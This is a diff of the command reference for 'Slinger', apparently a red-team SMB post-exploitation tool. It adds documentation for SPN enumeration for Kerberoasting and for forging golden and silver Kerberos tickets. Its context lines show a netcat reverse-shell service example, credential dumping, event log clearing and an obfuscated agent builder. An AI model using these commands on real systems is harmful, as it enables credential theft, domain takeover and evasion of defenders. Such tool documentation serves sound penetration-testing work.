@@ -28,10 +28,9 @@ Example Usage: use <sharename> | use C$
 
 **Help:**
 ```
-usage: ls [-h] [-s {name,size,created,lastaccess,lastwrite}]
-                  [--sort-reverse] [-l] [-r depth] [-o filename] [--show]
-                  [--type {f,d,a}]
-                  [path]
+usage: ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [--sort-reverse]
+          [-l] [-r depth] [-o filename] [--show] [--type {f,d,a}]
+          [path]
 List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
 ```
 
@@ -73,13 +72,13 @@ ls --type f -r 2        # Recursively list only files to depth 2
 
 **Help:**
 ```
-usage: find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE]
-                    [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex]
-                    [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
-                    [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}]
-                    [--reverse] [--format {table,list,paths,json}] [-o OUTPUT]
-                    [--empty] [--hidden] [--progress] [--timeout TIMEOUT]
-                    pattern
+usage: find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE] [--mtime MTIME]
+            [--ctime CTIME] [--atime ATIME] [--regex] [--iname]
+            [--maxdepth MAXDEPTH] [--mindepth MINDEPTH] [--limit LIMIT]
+            [--sort {name,size,mtime,ctime,atime}] [--reverse]
+            [--format {table,list,paths,json}] [-o OUTPUT] [--empty]
+            [--hidden] [--progress] [--timeout TIMEOUT]
+            pattern
 Search for files and directories across the remote share with advanced filtering options.
 ```
 
@@ -185,7 +184,7 @@ Example Usage: shares
 **Help:**
 ```
 usage: enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
-                         [--output filename]
+                 [--output filename]
 Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
 ```
 
@@ -1064,7 +1063,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 **Help:**
 ```
 usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+                  -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1098,7 +1097,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 **Help:**
 ```
 usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+                  -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1132,7 +1131,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 **Help:**
 ```
 usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+                  -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1166,7 +1165,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 **Help:**
 ```
 usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+                  -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1200,10 +1199,10 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 **Help:**
 ```
 usage: servicemodify [-h] [--binary-path BINARY_PATH]
-                             [--display-name DISPLAY_NAME]
-                             [--start-type {auto,demand,disabled,system}]
-                             [--account ACCOUNT] [--password PASSWORD]
-                             [-i SERVICEID | service_name]
+                     [--display-name DISPLAY_NAME]
+                     [--start-type {auto,demand,disabled,system}]
+                     [--account ACCOUNT] [--password PASSWORD]
+                     [-i SERVICEID | service_name]
 Modify service binary path, display name, start type, or account
 ```
 
@@ -1249,10 +1248,10 @@ Examples:
 **Help:**
 ```
 usage: servicemodify [-h] [--binary-path BINARY_PATH]
-                             [--display-name DISPLAY_NAME]
-                             [--start-type {auto,demand,disabled,system}]
-                             [--account ACCOUNT] [--password PASSWORD]
-                             [-i SERVICEID | service_name]
+                     [--display-name DISPLAY_NAME]
+                     [--start-type {auto,demand,disabled,system}]
+                     [--account ACCOUNT] [--password PASSWORD]
+                     [-i SERVICEID | service_name]
 Modify service binary path, display name, start type, or account
 ```
 
@@ -1298,10 +1297,10 @@ Examples:
 **Help:**
 ```
 usage: servicemodify [-h] [--binary-path BINARY_PATH]
-                             [--display-name DISPLAY_NAME]
-                             [--start-type {auto,demand,disabled,system}]
-                             [--account ACCOUNT] [--password PASSWORD]
-                             [-i SERVICEID | service_name]
+                     [--display-name DISPLAY_NAME]
+                     [--start-type {auto,demand,disabled,system}]
+                     [--account ACCOUNT] [--password PASSWORD]
+                     [-i SERVICEID | service_name]
 Modify service binary path, display name, start type, or account
 ```
 
@@ -1488,7 +1487,7 @@ Example Usage: tasksshow -i 123
 **Help:**
 ```
 usage: taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
-                          [-i INTERVAL] [-d DATE]
+                  [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1527,7 +1526,7 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 **Help:**
 ```
 usage: taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
-                          [-i INTERVAL] [-d DATE]
+                  [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1565,8 +1564,7 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-usage: taskimport [-h] -f FILE [-n NAME] [-d FOLDER] [--test]
-                          [--force]
+usage: taskimport [-h] -f FILE [-n NAME] [-d FOLDER] [--test] [--force]
 Import a scheduled task from a local XML definition file
 ```
 
@@ -1816,7 +1814,7 @@ Example Usage: upload /local/path /remote/path
 **Help:**
 ```
 usage: download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
-                        remote_path [local_path]
+                remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1846,7 +1844,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 **Help:**
 ```
 usage: download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
-                        remote_path [local_path]
+                remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -2230,8 +2228,8 @@ Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\
 **Help:**
 ```
 usage: regsearch [-h] [-k KEY] [--maxdepth MAXDEPTH] [--values]
-                         [--limit LIMIT] [--format {table,json}]
-                         pattern
+                 [--limit LIMIT] [--format {table,json}]
+                 pattern
 Recursively search registry for keys and values matching a pattern
 ```
 
@@ -2503,8 +2501,8 @@ Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
 
 **Help:**
 ```
-usage: secretsdump [-h] [--sam] [--lsa] [--ntds] [--just-dc-ntlm]
-                           [--history] [-o OUTPUT]
+usage: secretsdump [-h] [--sam] [--lsa] [--ntds] [--just-dc-ntlm] [--history]
+                   [-o OUTPUT] [--tmp-path PATH]
 Extract credentials using the existing SMB session. Supports SAM hashes, LSA secrets (cached domain creds, service passwords), and NTDS.dit (domain controllers only via DRS replication).
 ```
 
@@ -2526,6 +2524,9 @@ Examples:
 - **`output`**: Save extracted secrets to file
   - Required: No
 
+- **`tmp_path`**: Absolute disk path for temporary hive files (default: auto per share). Must be writable by SYSTEM and accessible from the connected share
+  - Required: No
+
 ---
 
 ## `hashdump`
@@ -2534,8 +2535,8 @@ Examples:
 
 **Help:**
 ```
-usage: secretsdump [-h] [--sam] [--lsa] [--ntds] [--just-dc-ntlm]
-                           [--history] [-o OUTPUT]
+usage: secretsdump [-h] [--sam] [--lsa] [--ntds] [--just-dc-ntlm] [--history]
+                   [-o OUTPUT] [--tmp-path PATH]
 Extract credentials using the existing SMB session. Supports SAM hashes, LSA secrets (cached domain creds, service passwords), and NTDS.dit (domain controllers only via DRS replication).
 ```
 
@@ -2555,6 +2556,178 @@ Examples:
 ### Arguments
 
 - **`output`**: Save extracted secrets to file
+  - Required: No
+
+- **`tmp_path`**: Absolute disk path for temporary hive files (default: auto per share). Must be writable by SYSTEM and accessible from the connected share
+  - Required: No
+
+---
+
+## `spnenum`
+
+**Description:** Query SPNs from the domain for Kerberoasting / silver ticket targets
+
+**Help:**
+```
+usage: spnenum [-h] --method {atexec,wmiexec} [--query QUERY] [--sp PATH]
+               [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+               [-w SECS]
+Query SPNs from the domain for Kerberoasting / silver ticket targets
+```
+
+**Example Usage:**
+```
+Examples:
+  spnenum --method atexec                    # List all SPNs via Task Scheduler
+  spnenum --method atexec --query "*/FOREST" # SPNs matching pattern
+  spnenum --method wmiexec                   # List all SPNs via WMI DCOM
+  spnenum --method atexec --query "MSSQLSvc/*"  # Find SQL Server SPNs
+
+Methods:
+  atexec   - Runs 'setspn -Q' as SYSTEM via Task Scheduler. Requires share connection.
+  wmiexec  - Runs 'setspn -Q' as SYSTEM via WMI DCOM. Requires DCOM ports.
+
+Note: Both methods save output to a temp file on target and retrieve it via SMB.
+      --sp should be reachable from the connected share.
+```
+
+### Arguments
+
+- **`method`**: Enumeration method: atexec (Task Scheduler) or wmiexec (WMI DCOM)
+  - Choices: atexec, wmiexec
+  - Required: Yes
+
+- **`query`**: SPN query pattern (default: */* for all SPNs)
+  - Default: `*/*`
+  - Required: No
+
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
+  - Default: `\Users\Public\Downloads\`
+  - Required: No
+
+- **`sn`**: Filename for command output (default: random)
+  - Required: No
+
+- **`tn`**: Scheduled task name (default: auto-generated)
+  - Required: No
+
+- **`ta`**: Task author for OPSEC (default: Slinger)
+  - Default: `Slinger`
+  - Required: No
+
+- **`td`**: Task description for OPSEC (default: Slinger Task)
+  - Default: `Slinger Task`
+  - Required: No
+
+- **`tf`**: Task Scheduler folder (default: \Windows)
+  - Default: `\Windows`
+  - Required: No
+
+- **`wait`**: Seconds to wait for task completion (default: 2)
+  - Default: `2`
+  - Required: No
+
+---
+
+## `ticket`
+
+**Description:** Forge Kerberos tickets using extracted hashes. Golden tickets use the krbtgt hash (full domain access). Silver tickets use a service account hash (access to specific service).
+
+**Help:**
+```
+usage: ticket [-h] {golden,silver} ...
+Forge Kerberos tickets using extracted hashes. Golden tickets use the krbtgt hash (full domain access). Silver tickets use a service account hash (access to specific service).
+```
+
+**Example Usage:**
+```
+Examples:
+  ticket golden --nthash <krbtgt_hash>                         # Golden ticket as Administrator
+  ticket golden --nthash <hash> --user svc_admin --user-id 1001
+  ticket golden --aesKey <aes256_key> --domain htb.local
+  ticket silver --nthash <machine_hash> --spn cifs/dc01.htb.local
+  ticket silver --nthash <hash> --spn http/web01.htb.local --user admin
+
+Note: Domain SID auto-fetched via SAMR if not provided.
+      Requires krbtgt hash (golden) or service account hash (silver) from secretsdump --ntds.
+```
+
+### Subcommands
+
+#### `ticket golden`
+
+**Description:** Forge a TGT using the krbtgt NTLM hash or AES key. Grants full domain access as any user.
+
+**Help:**
+```
+usage: ticket golden [-h] [--nthash NTHASH] [--aesKey AESKEY]
+                     [--domain DOMAIN] [--domain-sid DOMAIN_SID] [--user USER]
+                     [--user-id USER_ID] [--groups GROUPS]
+                     [--extra-sid EXTRA_SID] [--duration DURATION] [-o OUTPUT]
+Forge a TGT using the krbtgt NTLM hash or AES key. Grants full domain access as any user.
+```
+
+**Example Usage:**
+```
+Examples:
+  ticket golden --nthash <krbtgt_hash>
+  ticket golden --nthash <hash> --user svc_admin --user-id 1001
+  ticket golden --aesKey <aes256> --groups "513, 512, 520, 518, 519"
+  ticket golden --nthash <hash> --extra-sid S-1-5-21-...-519 -o admin.ccache
+```
+
+##### Arguments
+
+- **`nthash`**: krbtgt NTLM hash for ticket signing
+- **`aesKey`**: krbtgt AES key (128 or 256 bit) for ticket signing
+- **`domain`**: Domain FQDN (default: session domain)
+- **`domain_sid`**: Domain SID (auto-fetched if not provided)
+- **`user`**: User to impersonate (default: Administrator)
+  - Default: `Administrator`
+- **`user_id`**: User RID (default: 500)
+  - Default: `500`
+- **`groups`**: Group RIDs (default: Domain Users, Domain Admins, etc.)
+  - Default: `513, 512, 520, 518, 519`
+- **`extra_sid`**: Extra SID to add to ticket (for cross-domain)
+- **`duration`**: Ticket duration in hours (default: 87600 = 10 years)
+  - Default: `87600`
+- **`output`**: Output ccache file path (default: ~/.slinger/<user>.ccache)
+  - Required: No
+
+---
+
+#### `ticket silver`
+
+**Description:** Forge a TGS for a specific service using the service account's NTLM hash or AES key.
+
+**Help:**
+```
+usage: ticket silver [-h] [--nthash NTHASH] [--aesKey AESKEY] --spn SPN
+                     [--domain DOMAIN] [--domain-sid DOMAIN_SID] [--user USER]
+                     [--user-id USER_ID] [-o OUTPUT]
+Forge a TGS for a specific service using the service account's NTLM hash or AES key.
+```
+
+**Example Usage:**
+```
+Examples:
+  ticket silver --nthash <machine_hash> --spn cifs/dc01.htb.local
+  ticket silver --nthash <hash> --spn http/web01.htb.local --user admin
+  ticket silver --aesKey <aes256> --spn ldap/dc01.htb.local
+```
+
+##### Arguments
+
+- **`nthash`**: Service account NTLM hash for ticket signing
+- **`aesKey`**: Service account AES key (128 or 256 bit)
+- **`spn`**: Target SPN (e.g., cifs/dc01.domain.com)
+- **`domain`**: Domain FQDN (default: session domain)
+- **`domain_sid`**: Domain SID (auto-fetched if not provided)
+- **`user`**: User to impersonate (default: Administrator)
+  - Default: `Administrator`
+- **`user_id`**: User RID (default: 500)
+  - Default: `500`
+- **`output`**: Output ccache file path (default: ~/.slinger/<user>.ccache)
   - Required: No
 
 ---
@@ -2652,15 +2825,17 @@ Example Usage: network
 **Help:**
 ```
 usage: atexec [-h] -c COMMAND [--sp SP] [--sn SN] [--tn TN] [--ta TA]
-                      [--td TD] [--tf TF] [--sh SH] [--no-output] [-i]
-                      [-w WAIT]
+              [--td TD] [--tf TF] [--no-output] [-i] [-w WAIT]
 Execute a command on the remote server
 ```
 
 **Example Usage:**
 ```
-Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\Users\\Public\\Downloads\\ -c ipconfig
+Example Usage: atexec -tn "NetSvc" -sp \\Users\\Public\\Downloads\\ -c ipconfig
 For multi-word commands: atexec -c "echo hello world" -tn MyTask
+
+Note: Output is saved to a temp file on target and retrieved via SMB.
+--sp should be reachable from the connected share (auto-adjusted per share type).
 ```
 
 ### Arguments
@@ -2668,7 +2843,7 @@ For multi-word commands: atexec -c "echo hello world" -tn MyTask
 - **`command`**: Specify the command to execute. For commands with spaces, wrap in quotes (e.g., 'echo hello world')
   - Required: Yes
 
-- **`sp`**: Specify the folder to save the output file
+- **`sp`**: Folder to save output file (default: auto per share, e.g., \Temp\ on ADMIN$)
   - Default: `\Users\Public\Downloads\`
   - Required: No
 
@@ -2688,10 +2863,6 @@ For multi-word commands: atexec -c "echo hello world" -tn MyTask
 
 - **`tf`**: Specify the folder to run the task in
   - Default: `\Windows`
-  - Required: No
-
-- **`sh`**: Specify the share name to connect to
-  - Default: `C$`
   - Required: No
 
 - **`wait`**: Seconds to wait for the task to complete
@@ -2740,9 +2911,8 @@ Example Usage: plugins
 
 **Help:**
 ```
-usage: changes [-h]
-                       [--category {FILE,SERVICE,TASK,REGISTRY,AGENT,EXEC}]
-                       [--save] [--clear]
+usage: changes [-h] [--category {FILE,SERVICE,TASK,REGISTRY,AGENT,EXEC}]
+               [--save] [--clear]
 Display audit trail of all write operations this session
 ```
 
@@ -2839,16 +3009,14 @@ Examples:
 
 **Help:**
 ```
-usage: eventlog query [-h] --method {rpc,atexec,wmiexec} --log LOG
-                              [--id ID]
-                              [--type {error,warning,information,success,failure}]
-                              [--since SINCE] [--last MINUTES] [--limit LIMIT]
-                              [--source SOURCE] [--find FIND]
-                              [--format {table,json,list,csv}] [-o OUTPUT]
-                              [--verbose] [--order {newest,oldest}]
-                              [--sp PATH] [--sn NAME] [--tn NAME]
-                              [--ta AUTHOR] [--td DESC] [--tf FOLDER]
-                              [--sh SHARE] [-w SECS]
+usage: eventlog query [-h] --method {rpc,atexec,wmiexec} --log LOG [--id ID]
+                      [--type {error,warning,information,success,failure}]
+                      [--since SINCE] [--last MINUTES] [--limit LIMIT]
+                      [--source SOURCE] [--find FIND]
+                      [--format {table,json,list,csv}] [-o OUTPUT] [--verbose]
+                      [--order {newest,oldest}] [--sp PATH] [--sn NAME]
+                      [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                      [-w SECS]
 Query Windows Event Log entries with filtering and export
 ```
 
@@ -2890,7 +3058,7 @@ Methods:
 - **`order`**: Order events by newest first (default) or oldest first
   - Choices: newest, oldest
   - Default: `newest`
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -2900,7 +3068,6 @@ Methods:
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -2914,8 +3081,8 @@ Methods:
 **Help:**
 ```
 usage: eventlog list [-h] --method {rpc,atexec,wmiexec} [--sp PATH]
-                             [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
-                             [--tf FOLDER] [--sh SHARE] [-w SECS]
+                     [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                     [--tf FOLDER] [-w SECS]
 List all available event logs on the remote system
 ```
 
@@ -2931,7 +3098,7 @@ Examples:
 
 - **`method`**: Method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
   - Choices: rpc, atexec, wmiexec
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -2941,7 +3108,6 @@ Examples:
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -2954,10 +3120,9 @@ Examples:
 
 **Help:**
 ```
-usage: eventlog check [-h] --method {rpc,atexec,wmiexec} --log LOG
-                              [--sp PATH] [--sn NAME] [--tn NAME]
-                              [--ta AUTHOR] [--td DESC] [--tf FOLDER]
-                              [--sh SHARE] [-w SECS]
+usage: eventlog check [-h] --method {rpc,atexec,wmiexec} --log LOG [--sp PATH]
+                      [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                      [--tf FOLDER] [-w SECS]
 Check if a specific Windows Event Log exists and is accessible
 ```
 
@@ -2974,7 +3139,7 @@ Examples:
 - **`method`**: Method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
   - Choices: rpc, atexec, wmiexec
 - **`log`**: Event log name to check (can include custom paths)
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -2984,7 +3149,6 @@ Examples:
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -2997,10 +3161,9 @@ Examples:
 
 **Help:**
 ```
-usage: eventlog clear [-h] --log LOG --method {rpc,atexec,wmiexec}
-                              [--force] [--sp PATH] [--sn NAME] [--tn NAME]
-                              [--ta AUTHOR] [--td DESC] [--tf FOLDER]
-                              [--sh SHARE] [-w SECS]
+usage: eventlog clear [-h] --log LOG --method {rpc,atexec,wmiexec} [--force]
+                      [--sp PATH] [--sn NAME] [--tn NAME] [--ta AUTHOR]
+                      [--td DESC] [--tf FOLDER] [-w SECS]
 Clear all events from a Windows Event Log (cannot be undone)
 ```
 
@@ -3015,6 +3178,9 @@ Methods:
   rpc      - Direct RPC via \pipe\eventlog. Requires SE_SECURITY_PRIVILEGE (fails with UAC filtering)
   atexec   - Runs 'wevtutil cl' as SYSTEM via Task Scheduler. Requires share connection. Leaves Event ID 1102
   wmiexec  - Runs 'wevtutil cl' as SYSTEM via WMI DCOM. Requires DCOM ports (135+dynamic). Leaves Event ID 1102
+
+Note: atexec/wmiexec save output to a temp file on target and retrieve it via SMB.
+      --sp should be reachable from the connected share.
 ```
 
 ##### Arguments
@@ -3022,7 +3188,7 @@ Methods:
 - **`log`**: Event log name to clear
 - **`method`**: Clearing method: rpc, atexec (Task Scheduler), or wmiexec (WMI DCOM)
   - Choices: rpc, atexec, wmiexec
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -3032,7 +3198,6 @@ Methods:
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -3091,9 +3256,9 @@ Example Usage:
 **Help:**
 ```
 usage: wmiexec dcom [-h] [-c COMMAND] [-i] [--timeout TIMEOUT]
-                            [--output filename] [--no-output]
-                            [--sleep-time SLEEP_TIME] [--sp PATH] [--sn NAME]
-                            [--raw-command] [--shell {cmd,powershell}]
+                    [--output filename] [--no-output]
+                    [--sleep-time SLEEP_TIME] [--sp PATH] [--sn NAME]
+                    [--raw-command] [--shell {cmd,powershell}]
 Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
 ```
 
@@ -3127,6 +3292,8 @@ Interactive Mode:
   wmiexec dcom -i --shell powershell                       # Interactive PowerShell shell
 
 Note: WMI working directory syncs with SMB 'cd'. Use 'cd' to change directory before running commands.
+      Output is saved to a temp file on target and retrieved via SMB.
+      --sp must be a path reachable from the connected share (e.g., \Temp\ on ADMIN$).
 ```
 
 ##### Arguments
@@ -3137,7 +3304,7 @@ Note: WMI working directory syncs with SMB 'cd'. Use 'cd' to change directory be
 - **`output`**: Save command output to local file
 - **`sleep_time`**: Sleep time before capturing output in seconds
   - Default: `1.0`
-- **`save_path`**: Directory on target to save output file (default: auto-detect from share)
+- **`save_path`**: Directory on target to save output file (default: auto per share). Should be reachable from the connected share
 - **`save_name`**: Custom filename for remote output capture (default: auto-generated)
 - **`shell`**: Shell to use for command execution
   - Choices: cmd, powershell
@@ -3171,16 +3338,15 @@ Examples:
 **Help:**
 ```
 usage: wmiexec event [-h] [--consumer-name CONSUMER_NAME]
-                             [--filter-name FILTER_NAME]
-                             [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
-                             [--timeout TIMEOUT] [--no-output]
-                             [--save filename] [--working-dir WORKING_DIR]
-                             [--shell {cmd,powershell}] [--exe {cmd,pwsh}]
-                             [--trigger-exe TRIGGER_EXE] [-t TRIGGER] [-l]
-                             [-i] [--system] [--upload-path UPLOAD_PATH]
-                             [--script-name SCRIPT_NAME] [-o OUTPUT]
-                             [--raw-command] [--raw-exec RAW_EXEC]
-                             [command]
+                     [--filter-name FILTER_NAME]
+                     [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
+                     [--timeout TIMEOUT] [--no-output] [--save filename]
+                     [--working-dir WORKING_DIR] [--shell {cmd,powershell}]
+                     [--exe {cmd,pwsh}] [--trigger-exe TRIGGER_EXE]
+                     [-t TRIGGER] [-l] [-i] [--system]
+                     [--upload-path UPLOAD_PATH] [--script-name SCRIPT_NAME]
+                     [-o OUTPUT] [--raw-command] [--raw-exec RAW_EXEC]
+                     [command]
 Execute commands using WMI Event Consumers (highest stealth method).
 
 Examples:
@@ -3238,11 +3404,10 @@ Examples:
 **Help:**
 ```
 usage: wmiexec query [-h] [--namespace NAMESPACE]
-                             [--format {list,table,json,csv}] [-o FILE]
-                             [--timeout SECONDS]
-                             [--interactive | --describe CLASS |
-                             --list-classes | --template TEMPLATE |
-                             --list-templates | query]
+                     [--format {list,table,json,csv}] [-o FILE]
+                     [--timeout SECONDS]
+                     [--interactive | --describe CLASS | --list-classes |
+                     --template TEMPLATE | --list-templates | query]
 Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
 ```
 
@@ -3283,7 +3448,7 @@ Query Examples:
 **Help:**
 ```
 usage: agent [-h]
-                     {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
+             {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
 Build polymorphic C++ agents for named pipe command execution
 ```
 
@@ -3301,10 +3466,9 @@ Example Usage: agent build --arch x64 | agent deploy ./agent.exe --path temp\\ -
 **Help:**
 ```
 usage: agent build [-h] [--arch {x86,x64,both}] [--encryption]
-                           [--no-encryption] [--debug]
-                           [--output-dir OUTPUT_DIR] [--dry-run] [--pipe PIPE]
-                           [--name NAME] [--pass PASSPHRASE] [--obfuscate]
-                           [--upx PATH]
+                   [--no-encryption] [--debug] [--output-dir OUTPUT_DIR]
+                   [--dry-run] [--pipe PIPE] [--name NAME] [--pass PASSPHRASE]
+                   [--obfuscate] [--upx PATH]
 Build C++ agents with advanced obfuscation and polymorphic encryption
 ```
 
@@ -3359,10 +3523,10 @@ Display configuration and capabilities of the agent builder
 **Help:**
 ```
 usage: agent deploy [-h] --path PATH --name NAME [--start]
-                            [--method {wmiexec,atexec}] [--pipe PIPE]
-                            [--sp PATH] [--sn NAME] [--tn NAME] [--ta AUTHOR]
-                            [--td DESC] [--tf FOLDER] [--sh SHARE] [-w SECS]
-                            agent_path
+                    [--method {wmiexec,atexec}] [--pipe PIPE] [--sp PATH]
+                    [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                    [--tf FOLDER] [-w SECS]
+                    agent_path
 Upload and execute polymorphic agent on target system via SMB
 ```
 
@@ -3388,7 +3552,7 @@ Note: --method, --ta, --td, --tf and other atexec options only apply with --meth
   - Choices: wmiexec, atexec
   - Default: `wmiexec`
 - **`pipe`**: Specify pipe name for the agent (must match build-time pipe name)
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -3398,7 +3562,6 @@ Note: --method, --ta, --td, --tf and other atexec options only apply with --meth
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -3412,7 +3575,7 @@ Note: --method, --ta, --td, --tf and other atexec options only apply with --meth
 **Help:**
 ```
 usage: agent list [-h] [--host HOST] [--del DELETE_AGENT]
-                          [-f {table,list,json}]
+                  [-f {table,list,json}]
 Show all deployed agents and their status
 ```
 
@@ -3547,10 +3710,10 @@ Example: agent use agent_12345 --no-colors
 
 **Help:**
 ```
-usage: agent start [-h] [--method {wmiexec,atexec}] [--sp PATH]
-                           [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
-                           [--tf FOLDER] [--sh SHARE] [-w SECS]
-                           agent_id
+usage: agent start [-h] [--method {wmiexec,atexec}] [--sp PATH] [--sn NAME]
+                   [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
+                   [-w SECS]
+                   agent_id
 Start a stopped or crashed agent using its deployment information
 ```
 
@@ -3563,6 +3726,8 @@ Examples:
 
 Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
       They are ignored when using the default wmiexec method.
+      Both methods save output to a temp file on target and retrieve it via SMB.
+      --sp should be reachable from the connected share.
 
 ```
 
@@ -3572,7 +3737,7 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 - **`method`**: Execution method to start agent (default: wmiexec)
   - Choices: wmiexec, atexec
   - Default: `wmiexec`
-- **`sp`**: Directory on target to save command output (default: \Users\Public\Downloads\)
+- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
   - Default: `\Users\Public\Downloads\`
 - **`sn`**: Filename for command output (default: random)
 - **`tn`**: Scheduled task name (default: auto-generated)
@@ -3582,7 +3747,6 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
   - Default: `Slinger Task`
 - **`tf`**: Task Scheduler folder (default: \Windows)
   - Default: `\Windows`
-- **`sh`**: SMB share for output file (default: current share)
 - **`wait`**: Seconds to wait for task completion (default: 2)
   - Default: `2`
   - Required: No
@@ -3595,10 +3759,10 @@ Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
 
 **Help:**
 ```
-usage: agent kill [-h] [--method {wmiexec,atexec}] [--sp PATH]
-                          [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
-                          [--tf FOLDER] [--sh SHARE] [-w SECS]
-                          agent_id
